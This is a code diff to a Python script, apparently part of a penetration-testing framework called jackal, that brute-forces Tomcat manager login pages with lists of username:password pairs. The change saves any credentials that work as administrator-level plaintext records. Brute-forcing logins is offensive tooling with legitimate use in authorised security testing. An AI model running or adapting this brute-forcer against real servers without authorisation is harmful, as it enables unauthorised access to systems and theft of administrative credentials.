@@ -3,11 +3,11 @@ import base64
 import sys
 import grequests
 import gevent
-from jackal import ServiceSearch
+from jackal import ServiceSearch, Credential
 from jackal.utils import print_success, print_notification, print_error
 
 
-def brutefore_passwords(ip, url, credentials):
+def brutefore_passwords(ip, url, credentials, service):
     """
         Bruteforce function, will try all the credentials at the same time, splits the given credentials at a ':'.
     """
@@ -27,6 +27,8 @@ def brutefore_passwords(ip, url, credentials):
             creds = creds.split(':')
             print_success("Found a password for tomcat: {0}:{1} at: {2}".format(
                 creds[0], creds[1], url))
+            credential = Credential(secret=creds[1], username=creds[0], type='plaintext', access_level='administrator', service_id=service.id, host_ip=ip, description='Tomcat')
+            credential.save()
 
 
 def main():
@@ -51,7 +53,7 @@ def main():
     for service in services:
         print_notification("Checking ip:{} port {}".format(service.address, service.port))
         url = 'http://{}:{}/manager/html'
-        gevent.spawn(brutefore_passwords, service.address, url.format(service.address, service.port), credentials)
+        gevent.spawn(brutefore_passwords, service.address, url.format(service.address, service.port), credentials, service)
         service.add_tag('tomcat_brute')
         service.update(tags=service.tags)
 
